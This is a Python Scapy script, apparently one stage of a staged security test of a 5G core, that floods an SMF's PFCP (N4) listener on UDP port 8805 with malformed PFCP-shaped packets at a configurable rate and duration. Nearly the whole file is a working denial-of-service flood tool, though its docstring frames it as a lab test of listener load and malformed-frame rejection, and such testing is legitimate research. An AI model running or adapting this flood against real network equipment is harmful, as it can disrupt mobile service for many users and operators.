#!/usr/bin/env python3
"""
Stage 15b — Endpoint DoS via N4 (PFCP) volume
Scenario 3: Service Disruption

Note: Scapy has no built-in PFCP layer, so this sends UDP volume at
SMF's PFCP listener with a minimal, likely-malformed PFCP-shaped
header rather than a fully protocol-valid PFCP message. This tests
whether the listener itself becomes a bottleneck under raw volume,
and/or whether malformed PFCP framing gets rejected cheaply (same
pattern as Stage 11's initial malformed-GTP attempt).
"""

from scapy.all import IP, UDP, send
import time
import sys

SMF_ADDRESS = "192.168.134.128"
SMF_PFCP_PORT = 8805

def build_packet():
    # Minimal PFCP-shaped header: version/flags byte + message type byte
    # (0x20 = version 1, no seid) + padding - not a fully valid PFCP
    # Session Establishment Request, just plausible-looking framing.
    payload = b"\x20\x01" + b"\x00" * 20
    return IP(dst=SMF_ADDRESS) / UDP(dport=SMF_PFCP_PORT) / payload

def flood(duration_seconds=10, rate_per_second=1000):
    print(f"[*] Stage 15b - N4/PFCP volume against {SMF_ADDRESS}:{SMF_PFCP_PORT}")
    print(f"[*] Duration: {duration_seconds}s, target rate: ~{rate_per_second}/s\n")

    pkt = build_packet()
    pkt.show()
    print()

    end_time = time.time() + duration_seconds
    sent = 0
    try:
        while time.time() < end_time:
            send(pkt, count=rate_per_second // 10, inter=0.0001, verbose=False)
            sent += rate_per_second // 10
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] Stopped early by user.")

    print(f"[*] Total packets sent: {sent}")

if __name__ == "__main__":
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    flood(duration, rate)
